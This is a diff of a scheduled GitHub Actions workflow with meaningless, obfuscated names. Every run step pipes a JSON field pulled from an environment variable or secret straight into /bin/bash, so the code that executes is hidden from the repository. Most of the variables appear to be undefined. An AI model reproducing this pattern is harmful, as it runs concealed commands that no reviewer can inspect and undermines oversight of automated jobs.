@@ -1,23 +1,28 @@
 name: nongfeiting1524
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
+    - cron: '7 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nongfeiting1524
         env:
-          ms5: ${{ secrets.ms5 }}
+          coev44781: ${{ secrets.coev44781 }}
         run: |
-          echo $ms5 | jq -r .h5467 | /bin/bash
-          echo $a3 | jq -r .u1 | /bin/bash
-          echo $m2759 | jq -r .dch4 | /bin/bash
-          echo $jnveu0 | jq -r .iqucw3 | /bin/bash
-          echo $jfj0032 | jq -r .zhnq2653 | /bin/bash
-          echo $lro492 | jq -r .nzk17097 | /bin/bash
+          echo $coev44781 | jq -r .m41972 | /bin/bash
+          echo $s157 | jq -r .qhtz802 | /bin/bash
+          echo $i3372 | jq -r .gk57 | /bin/bash
+          echo $w5304 | jq -r .aeac198 | /bin/bash
+          echo $gjbh5043 | jq -r .dmsy69 | /bin/bash
+          echo $ck611 | jq -r .itjl9955 | /bin/bash
+          echo $dpifh08 | jq -r .jwdxm06 | /bin/bash
+          echo $qgezi8812 | jq -r .ah75 | /bin/bash
+          echo $yqn4023 | jq -r .ftl03079 | /bin/bash
+          echo $di85106 | jq -r .raz83 | /bin/bash
+          echo $xs6 | jq -r .qbycp49693 | /bin/bash
 
